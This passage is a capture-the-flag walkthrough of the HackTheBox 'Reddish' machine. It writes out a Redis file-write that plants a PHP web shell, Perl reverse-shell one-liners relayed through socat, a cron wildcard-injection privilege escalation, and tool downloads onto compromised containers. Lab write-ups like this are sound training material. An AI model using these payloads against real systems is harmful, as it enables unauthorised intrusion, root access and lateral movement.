<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>/&gt;</span><br><span class="line">        &lt;title&gt;Reddish&lt;/title&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;assets/jquery.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">                        $(document).ready(<span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">                                incrCounter();</span><br><span class="line">                            getData();</span><br><span class="line">                        &#125;);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="function"><span class="title">getData</span></span>() &#123;</span><br><span class="line">                            $.ajax(&#123;</span><br><span class="line">                                url: <span class="string">&quot;8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits&quot;</span>,</span><br><span class="line">                                cache: <span class="literal">false</span>,</span><br><span class="line">                                dataType: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">                                success: <span class="keyword">function</span> (data) &#123;</span><br><span class="line">                                            console.log(<span class="string">&quot;Number of hits:&quot;</span>, data)</span><br><span class="line">                                &#125;,</span><br><span class="line">                                error: <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">function</span> <span class="function"><span class="title">incrCounter</span></span>() &#123;</span><br><span class="line">                            $.ajax(&#123;</span><br><span class="line">                                url: <span class="string">&quot;8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits&quot;</span>,</span><br><span class="line">                                cache: <span class="literal">false</span>,</span><br><span class="line">                                dataType: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">                                success: <span class="keyword">function</span> (data) &#123;</span><br><span class="line">                              console.log(<span class="string">&quot;HITS incremented:&quot;</span>, data);</span><br><span class="line">                                &#125;,</span><br><span class="line">                                error: <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        /*</span><br><span class="line">                            * TODO</span><br><span class="line">                            *</span><br><span class="line">                            * 1. Share the web folder with the database container (Done)</span><br><span class="line">                            * 2. Add here the code to backup databases <span class="keyword">in</span> /f187a0ec71ce99642e4f0afbd441a68b folder</span><br><span class="line">                            * ...Still don<span class="string">&#x27;t know how to complete it...</span></span><br><span class="line"><span class="string">                        */</span></span><br><span class="line"><span class="string">                        function backupDatabase() &#123;</span></span><br><span class="line"><span class="string">                                $.ajax(&#123;</span></span><br><span class="line"><span class="string">                                        url: &quot;8924d0549008565c554f8128cd11fda4/ajax.php?backup=...&quot;,</span></span><br><span class="line"><span class="string">                                        cache: false,</span></span><br><span class="line"><span class="string">                                        dataType: &quot;text&quot;,</span></span><br><span class="line"><span class="string">                                        success: function (data) &#123;</span></span><br><span class="line"><span class="string">                                            console.log(&quot;Database saved:&quot;, data);</span></span><br><span class="line"><span class="string">                                        &#125;,</span></span><br><span class="line"><span class="string">                                        error: function () &#123;</span></span><br><span class="line"><span class="string">                                        &#125;</span></span><br><span class="line"><span class="string">                                &#125;);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;&lt;h1&gt;It works!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;This is the default web page for this server.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<p>There’s two important take-aways from this source:</p>
<ul>
<li><p>1.There are ajax calls to 8924d0549008565c554f8128cd11fda4/ajax.php. Based on the parameters values for the text of get hits and incr hits (which look like redis commands), I can hypothesize that these commands are executed on the redis database.</p>
</li>
<li><p>There’s some self-proclaimed incomplete code having to do with backing up that database. It does indicate that the web folder is shared with the database container.</p>
</li>
</ul>
<p>I can also test out these function in the firefox debug console:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">13:17:49.521 getData()</span><br><span class="line">13:17:49.668 undefined</span><br><span class="line">13:17:51.757 Number of hits: 1 127.0.0.1:19:20</span><br><span class="line">13:17:59.877 incrCounter()</span><br><span class="line">13:17:59.884 undefined</span><br><span class="line">13:18:05.446 getData()</span><br><span class="line">13:18:05.453 undefined</span><br><span class="line">13:18:07.953 Number of hits: 2</span><br></pre></td></tr></table></figure>

<p>What about trying to exercise the backup function? Visiting</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/ajax.php?backup=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>eventually has a timeout, which makes sense since the comments said it was not yet implemented:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught Exception: Cant <span class="built_in">read</span> line from socket. <span class="keyword">in</span> /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php:74 Stack trace: <span class="comment">#0 /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php(101): Client-&gt;readLine() #1 /var/www/html/8924d0549008565c554f8128cd11fda4/ajax.php(9): Client-&gt;sendCmd(NULL) #2 &#123;main&#125; thrown in /var/www/html/8924d0549008565c554f8128cd11fda4/lib/Client.php on line 74</span></span><br></pre></td></tr></table></figure>

<p>This error message does give me the absolute web path, which is the default apache path</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>

<h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><p>So I can do some interaction with the database through the website and JavaScript… But I can also interact directly with the Redis database.<br>Just like with www, I’ll use meterpreter to set up a tunnel into the subnet with www and redis:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 6379 -r 172.19.0.4 -p 6379</span><br><span class="line">[*] Local TCP relay created: :6379 &lt;-&gt; 172.19.0.4:6379</span><br></pre></td></tr></table></figure>

<p>do basic enumeration with nc:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 127.0.0.1 6379</span></span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">2</span><br><span class="line">incr hits</span><br><span class="line">:3</span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">3</span><br><span class="line">incr hits</span><br><span class="line">:4</span><br><span class="line">get hits</span><br><span class="line"><span class="variable">$1</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>install redis-cli for interaction with the db:</p>
<p>apt-get install redis-tools</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># redis-cli   # by default, connects to localhost 6379</span></span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 5</span><br><span class="line">(0.58s)</span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">(0.57s)</span><br><span class="line">127.0.0.1:6379&gt; incr hits</span><br><span class="line">(<span class="built_in">integer</span>) 7</span><br><span class="line">(0.58s)</span><br><span class="line">127.0.0.1:6379&gt; get hits</span><br><span class="line"><span class="string">&quot;7&quot;</span></span><br><span class="line">(0.63s)</span><br></pre></td></tr></table></figure>

<h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><p><span class="exturl" data-url="aHR0cHM6Ly9wYWNrZXRzdG9ybXNlY3VyaXR5LmNvbS9maWxlcy8xMzQyMDAvUmVkaXMtUmVtb3RlLUNvbW1hbmQtRXhlY3V0aW9uLmh0bWw=">This post<i class="fa fa-external-link-alt"></i></span> on PacketStorm details how I can use Redis to write arbitrary files on disk. I can flush the database, write some data into it, and then back it up to a target location. The article talks about writing an SSH key. SSH isn’t enabled here, but, because I know that the database server shares disk space with www, I can write a web shell.</p>
<ul>
<li>Exploit Limitations</li>
</ul>
<p>This isn’t by any means perfect. For example, the database will compress repeated text patterns, so could I lose some of the text I want to write. So for example, when I tried to write <br/> into multiple places in a php file, only the first actually made it through as desired. Even if I tried using <br/> and <br />, the second &lt;br was replaced with binary data. Similarly, when I wrote a command to get a perl reverse shell, the pattern ,”&gt;&amp;S”); was replaced and thus broke the script.</p>
<ul>
<li>Exploit to WebShell<br>Luckily for me, I can write a simple php webshell, and there’s no repeats, and php doesn’t care about garbage before or after the shell.</li>
</ul>
<p>Steps (all in redis-cli):</p>
<ul>
<li>flush the database</li>
<li>write shell to database</li>
<li>set directory</li>
<li>set filename</li>
<li>save</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat redis.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># redis-cli -h 127.0.0.1  flushall</span></span><br><span class="line">OK</span><br><span class="line">root@kali:~<span class="comment"># cat redis.txt | redis-cli -x set crackit</span></span><br><span class="line">OK</span><br><span class="line">root@kali:~<span class="comment"># redis-cli</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/www/html/8924d0549008565c554f8128cd11fda4/</span><br><span class="line">OK</span><br><span class="line">(0.60s)</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">&quot;df.php&quot;</span></span><br><span class="line">OK</span><br><span class="line">(0.60s)</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">(0.58s)</span><br></pre></td></tr></table></figure>

<p>Now check out <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS84OTI0ZDA1NDkwMDg1NjVjNTU0ZjgxMjhjZDExZmRhNC9kZi5waHA/Y21kPWlk">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=id<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REDIS0008� redis-ver4.0.9� redis-bits�@�ctime�&#125;_�used-mem¨? �aof-preamble���crackit+ uid=33(www-data) gid=33(www-data) groups=33(www-data) ��Z<span class="string">&quot;,���</span></span><br></pre></td></tr></table></figure>

<p>hostname shows the host is named www:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">REDIS0008� redis-ver4.0.9� redis-bits�@�ctime�&#125;_�used-mem¨? �aof-preamble���crackit+ www ��Z<span class="string">&quot;,���</span></span><br></pre></td></tr></table></figure>

<h3 id="Script-Redis-WebShell"><a href="#Script-Redis-WebShell" class="headerlink" title="Script Redis WebShell"></a>Script Redis WebShell</h3><p>The files in the web directory seem to be cleared out every 3 minutes (I’ll confirm this soon), so scripted the upload:</p>
<p>upload_shell.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">redis-cli -h 127.0.0.1 flushall</span><br><span class="line">cat redis.txt | redis-cli -h 127.0.0.1 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 127.0.0.1 config <span class="built_in">set</span> dir /var/www/html/8924d0549008565c554f8128cd11fda4/</span><br><span class="line">redis-cli -h 127.0.0.1 config <span class="built_in">set</span> dbfilename <span class="string">&quot;df.php&quot;</span></span><br><span class="line">redis-cli -h 127.0.0.1 save</span><br></pre></td></tr></table></figure>

<p>then run the script:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># ./upload_shell.sh </span></span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<h3 id="Interactive-Shell"><a href="#Interactive-Shell" class="headerlink" title="Interactive Shell"></a>Interactive Shell</h3><ul>
<li>Connectivity socat</li>
</ul>
<p>It doesn’t look like I can connect all the back to kali from this host. which ping returns /bin/ping, but trying to ping 10.10.14.9 doesn’t result in anything when watching in tcpdump. When I try to ping 172.19.0.3 (nodered), I get results</p>
<p>So I need to pivot through nodered. I’ll upload a static copy of socat to the box using the Node-Red flow for upload. Now I can use socat one of two ways:</p>
<ul>
<li>Relay traffic through nodered back to kali</li>
<li>Catch the callback on nodered</li>
</ul>
<p>do the first one, so in the shell on nodered, create a tunnel:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/tmp</span><br><span class="line"><span class="comment"># ./socat tcp-listen:223,fork tcp:10.10.14.9:223 &amp;</span></span><br></pre></td></tr></table></figure>

<p>That will run in the background, and forward any traffic that hits port 223 on nodered to my workstation on port 223.</p>
<ul>
<li>Execution<br>And, like nodered, there’s a limited toolset available. Luckily, perl is still present (a phrase I never thought I’d say).</li>
</ul>
<p>To get this working, it took a fair amount of playing with the url encoding. In the end, I had success by visiting the following url in a browser:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=perl%20<span class="_">-e</span>%20%27use%20Socket%3b<span class="variable">$i</span>%3d%22172.19.0.2%22%3b<span class="variable">$p</span>%3d223%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;open(STDIN,%22%3E%26S%22)%3bopen(STDOUT,%22%3E%26S%22)%3bopen(STDERR,%22%3E%26S%22)%3bexec(%22/bin/sh+-i%22)%3b&#125;%3b%27</span><br></pre></td></tr></table></figure>

<p>then we got the shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 223</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::223</span><br><span class="line">Ncat: Listening on 0.0.0.0:223</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:50210.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ ip addr</span></span><br><span class="line"><span class="string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span></span><br><span class="line"><span class="string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span></span><br><span class="line"><span class="string">    inet 127.0.0.1/8 scope host lo</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">11: eth0@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth0</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">13: eth1@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span></span><br><span class="line"><span class="string">    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 172.20.0.2/16 brd 172.20.255.255 scope global eth1</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">$ ls -la</span></span><br><span class="line"><span class="string">total 24</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 1000 1000 4096 Jul 16  2018 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 5 root root 4096 Jul 15  2018 ..</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root    9 Jul 16  2018 .bash_history -&gt; /dev/null</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000  220 Apr 23  2018 .bash_logout</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000 3771 Apr 23  2018 .bashrc</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 1000 1000  655 Apr 23  2018 .profile</span></span><br><span class="line"><span class="string">-r-------- 1 1000 1000   33 Apr 23  2018 user.txt</span></span><br></pre></td></tr></table></figure>

<p>ajax.php, which shows the commands running at the redis server:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat ajax.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once <span class="string">&#x27;lib/Autoloader.php&#x27;</span>;</span><br><span class="line">Autoloader::register();</span><br><span class="line"><span class="variable">$json</span> = new JsonResult();</span><br><span class="line"><span class="variable">$config</span> = new Config();</span><br><span class="line">foreach (<span class="variable">$config</span>-&gt;getPool() as <span class="variable">$key</span> =&gt; <span class="variable">$server</span>) &#123;</span><br><span class="line">        <span class="variable">$client</span> = new Client(<span class="variable">$server</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$client</span>-&gt;sendCmd(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Privesc-www-data-to-usertxt"><a href="#Privesc-www-data-to-usertxt" class="headerlink" title="Privesc www-data to usertxt"></a>Privesc www-data to usertxt</h2><h3 id="Identifying-Backup-Cron"><a href="#Identifying-Backup-Cron" class="headerlink" title="Identifying Backup Cron"></a>Identifying Backup Cron</h3><p>To get to user.txt, I’ll need to privesc. Looking around the box, there wasn’t a ton going on, so I decided to look for interesting processes starting and stopping. I’ve been a huge fan of pspy in the past for this, but since I’m two hops deep at this point, I’ll just using a bash script:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">IFS=$<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">old=$(ps -eo <span class="built_in">command</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    new=$(ps -eo <span class="built_in">command</span>)</span><br><span class="line">    diff &lt;(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$old</span>&quot;</span>) &lt;(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new</span>&quot;</span>) | grep [\&lt;\&gt;]</span><br><span class="line">    sleep .3</span><br><span class="line">    old=<span class="variable">$new</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>Running it shows some interesting scripts being run about every 3 minutes:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./proc.sh</span><br><span class="line">&gt; /usr/sbin/CRON</span><br><span class="line">&gt; /bin/sh -c sh /backup/backup.sh</span><br><span class="line">&gt; sh /backup/backup.sh</span><br><span class="line">&gt; rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br><span class="line">&gt; rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br></pre></td></tr></table></figure>

<p>Looking at /backup/backup.sh, it is saving the database, then removing the web folders and bringing them back in from a host named backup:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /backup/backup.sh</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br><span class="line">rsync -a *.rdb rsync://backup:873/src/rdb/</span><br><span class="line"><span class="built_in">cd</span> / &amp;&amp; rm -rf /var/www/html/*</span><br><span class="line">rsync -a rsync://backup:873/src/backup/ /var/www/html/</span><br><span class="line">chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploiting the Wildcard</li>
</ul>
<p>I can exploit the command rsync -a *.rdb rsync://backup:873/src/rdb, specifically the wildcard character. Because of how Unix handles wildcards, I can create a file named -e sh p.rdb, and that will evaluate to run sh p.rdb. The technique is detailed <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGVmZW5zZWNvZGUuY29tL3B1YmxpYy9EZWZlbnNlQ29kZV9Vbml4X1dpbGRDYXJkc19Hb25lX1dpbGQudHh0">here<i class="fa fa-external-link-alt"></i></span>.</p>
<p>I’ll first set up a tunnel on nodered:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./socat tcp-listen:9010,fork tcp:10.10.14.9:9010 &amp;</span></span><br></pre></td></tr></table></figure>

<p>Now write a perl reverse shell into a file and create the other file to run it. I’ll use base64 to easily move small files back and forth:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># cat shell.txt </span></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.19.0.2&quot;;$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># cat shell.txt | base64</span></span><br><span class="line">cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9J</span><br><span class="line">TkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2th</span><br><span class="line">ZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQs</span><br><span class="line">Ij4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg==</span><br></pre></td></tr></table></figure>

<p>I’ll create my reverse shell script as p.rdb, and then create the file that will call that abusing the wildcard with touch:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMiI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d &gt; /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/p.rdb</span><br><span class="line">$ touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb</span><br></pre></td></tr></table></figure>

<p>When the cron runs, I’ll catch a callback as root on www when the backup script runs:</p>
<p>and grab user.txt:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9010</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9010</span><br><span class="line">Ncat: Listening on 0.0.0.0:9010</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:54802.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># pwd</span></span><br><span class="line"><span class="string">/var/www/html/f187a0ec71ce99642e4f0afbd441a68b</span></span><br><span class="line"><span class="string"># cd /home</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">bergamotto</span></span><br><span class="line"><span class="string">lost+found</span></span><br><span class="line"><span class="string">somaro</span></span><br><span class="line"><span class="string"># cd somaro</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string"># cat user.txt</span></span><br><span class="line"><span class="string">c09aca7cb02c968b1e9637d51661f129</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb54.jpg"></li>
</ul>
<h3 id="File-Upload-to-www"><a href="#File-Upload-to-www" class="headerlink" title="File Upload to www"></a>File Upload to www</h3><p>To move to the next steps, I’ll want to get files uploaded to www, which is challenging without curl, wget, or nc. Here’s how I do it:</p>
<p>Start a tunnel on nodered that will listen (in this case on 8080) and forward that to my host:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./socat TCP-LISTEN:8080,fork TCP:10.10.14.9:8888 &amp;</span></span><br></pre></td></tr></table></figure>

<p>Use perl to request file:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># perl -e &#x27;use File::Fetch; my $url = &quot;http://172.19.0.2:8080/socat&quot;; my $ff = File::Fetch-&gt;new(uri =&gt; $url); my $file = $ff-&gt;fetch() or die $ff-&gt;error;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Serve from workstation:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python3 -m http.server 8888</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</span><br><span class="line">10.10.10.94 - - [25/Jul/2020 16:39:20] <span class="string">&quot;GET /socat HTTP/1.1&quot;</span> 304 -</span><br></pre></td></tr></table></figure>

<h2 id="backup-Container"><a href="#backup-Container" class="headerlink" title="backup Container"></a>backup Container</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>The backup script not only provides a path to root on www, but it also tells me about another host, backup. If I ping -c 1 backup, I’ll see it resolves to 127.20.0.2. I’ll upload nmap to www and see what’s open:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- --min-rate 5000 172.20.0.3</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-25 12:36 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2)</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.000034s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">873/tcp open  rsync</span><br><span class="line">MAC Address: 02:42:AC:14:00:02 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.23 seconds</span><br></pre></td></tr></table></figure>

<p>open on 873, rsync, which is how www was connecting to it.</p>
<p>I’ll update my diagram:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb55.jpg"></li>
</ul>
<h3 id="rsync-access"><a href="#rsync-access" class="headerlink" title="rsync access"></a>rsync access</h3><p>rsync gives me full read and write access to backup. I can read the file system:</p>
